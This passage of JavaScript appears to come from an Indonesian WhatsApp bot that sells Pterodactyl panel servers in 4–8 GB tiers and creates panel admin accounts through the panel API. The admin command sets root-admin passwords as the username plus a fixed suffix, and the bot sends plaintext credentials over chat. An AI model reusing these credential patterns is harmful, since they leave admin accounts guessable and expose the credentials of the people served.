if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "4gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4050"
let cpu = "170"
let disk = "4050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "5gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5050"
let cpu = "200"
let disk = "5050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "6gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6050"
let cpu = "230"
let disk = "6050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "7gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7050"
let cpu = "260"
let disk = "7050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "8gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8050"
let cpu = "280"
let disk = "8050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case 'addadmin':
case 'cadmin':
case 'buatadmin': {
if (!isDev) return replyy(`Kau ni ape kau tinggal sini ke`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Contoh :* ${prefix+command} nama,nomor`);

let username = t[0];
let name = username
let email = username + "@admin.varel"
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return replyy(`*Contoh :* ${prefix+command} name,nomor`);
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"adm0208"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = replyy(`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *UUID :* ${user.uuid}
┃ *Username :* ${user.username}
┃ *Email :* ${user.email}
┃ *Admin :* ${user.root_admin}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Data sudah di kirim ke pripat chet`)
let teksnyo = `
*BERIKUT DATA ADMIN PANEL ANDA*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *Email :* ${user.email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
*PROFIT :*
- *BISA CREAT PANEL*

